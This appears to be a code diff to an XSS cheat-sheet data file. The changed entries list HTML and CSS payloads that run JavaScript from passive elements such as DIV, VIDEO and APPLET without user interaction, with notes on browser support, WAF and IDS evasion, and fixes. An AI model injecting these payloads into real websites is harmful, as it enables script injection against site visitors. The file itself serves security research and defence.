@@ -5163,7 +5163,7 @@ return [
             'de'    : '',
             'zh'    : ''
         },
-        'data'      : '#Chrome, Opera, Safari and Edge\r\n<div onfocus="%js_alert%" contenteditable tabindex="0" id="xss"></div>\r\n\r\n# Firefox\r\n<div onbeforescriptexecute="%js_alert%"></div>\r\n<script>1</script>\r\n\r\n#MSIE10\r\n<div contenteditable onresize="%js_alert%"></div>\r\n\r\n# MSIE11\r\n<div onactivate="%js_alert%" id="xss" style="overflow:scroll"></div>\r\n<div onfocus="%js_alert%" id="xss" style="display:table">\r\n\r\n# Chrome, Opera, Safari\r\n<style>@keyframes x{}</style>\r\n<div style="animation-name:x" onanimationstart="%js_alert%"></div>\r\n\r\n# Chrome, Opera, Safari\r\n<style>\r\ndiv {width: 100px;}\r\ndiv:target {width: 200px;}\r\n</style>\r\n<div id="xss" onwebkittransitionend="%js_alert%" style="-webkit-transition: width .1s;"></div>',
+        'data'      : '#Chrome, Opera, Safari and Edge\r\n<div onfocus="%js_alert%" contenteditable tabindex="0" id="xss"></div>\r\n\r\n# Firefox\r\n<div onbeforescriptexecute="%js_alert%"></div>\r\n<script>1</script>\r\n\r\n#MSIE10\r\n<div contenteditable onresize="%js_alert%"></div>\r\n\r\n# MSIE11\r\n<div onactivate="%js_alert%" id="xss" style="overflow:scroll"></div>\r\n<div onfocus="%js_alert%" id="xss" style="display:table">\r\n\r\n# Chrome, Opera, Safari\r\n<style>@keyframes x{}</style>\r\n<div style="animation-name:x" onanimationstart="%js_alert%"></div>\r\n\r\n# Chrome, Opera, Safari\r\n<style>\r\ndiv {width: 100px;}\r\ndiv:target {width: 200px;}\r\n</style>\r\n<div id="xss" onwebkittransitionend="%js_alert%" style="-webkit-transition: width .1s;"></div>\r\n\r\n# Safari\r\n<div style="overflow:-webkit-marquee" onscroll="alert(1)"></div>',
         'description' : {
             'en'    : 'Often, an attacker can only inject into a "passive" element, meaning for instance a DIV or a SPAN. For those elements, it\'s not always trivial to execute injected JavaScript without user interaction (such as clicks or mouse events). If the element injected into is outside the visible range, it becomes hard to prove that the injection is in fact exploitable. For this reason, this item lists all currently known ways of executing JavaScript without user interaction from passive elements. The list is expected to grow over time.\r\n\r\nNote, that for some of the attacks here, the string "#xss" needs to be appended to the URL of the injected page.',
             'ja'    : '',
@@ -5189,7 +5189,7 @@ return [
             'safari' : ['4.0', 'latest']
         },
         'tags'      : ['user interaction', 'passive elements', 'html5', 'css', 'contenteditable'],
-        'reporter'  : '.mario, Ben Hayak, avlidienbrunn'
+        'reporter'  : '.mario, Ben Hayak, avlidienbrunn, Masato Kinugawa'
     },
     { /* ID 146 - JavaScript execution via <FRAMESET> and onpageshow  */
         'id'         : 146,
@@ -5270,7 +5270,7 @@ return [
             'cs' : '',
             'de' : ''
         },
-        'data'       : '<video src onratechange="alert(1)">',
+        'data'       : '<video src onratechange="%js_alert%">',
         'description': {
             'en' : 'The <VIDEO> element fires an "onratechange" event without user interaction on Firefox, even if no actual value for the "src" attribute is given. This can be used to bypass WAF and IDS systems as this combination of tag and attributes is rather uncommon and unknown.',
             'ja' : '',
@@ -5291,6 +5291,38 @@ return [
         },
         'tags'      : ['video', 'onratechange', 'html5', 'user interaction', 'src'],
         'reporter'  : 'Qab'
+    },
+    { /* ID 149 - JavaScript execution via <APPLET> with error events */
+        'id'         : 149,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'JavaScript execution via <APPLET> with error events',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },
+        'data'       : '<applet onerror="%js_alert%"></applet>',
+        'description': {
+            'en' : 'The <APPLET> element fires an "onerror" event without user interaction on Internet Explorer and Edge. This can be used to bypass WAF and IDS systems as this combination of tag and attributes is meanwhile rather uncommon and unknown.',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : 'Be sure to work with whitelists when allowing users to submit markup - else legacy tags like <APPLET> might be forgotten to filter and escape.',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },
+        'browsers'  : {
+            'internet explorer' : ['11.0', 'latest']
+        },
+        'tags'      : ['applet', 'onerror', 'html', 'legacy'],
+        'reporter'  : 'Ben Hayak'
     }
 ]
 }));
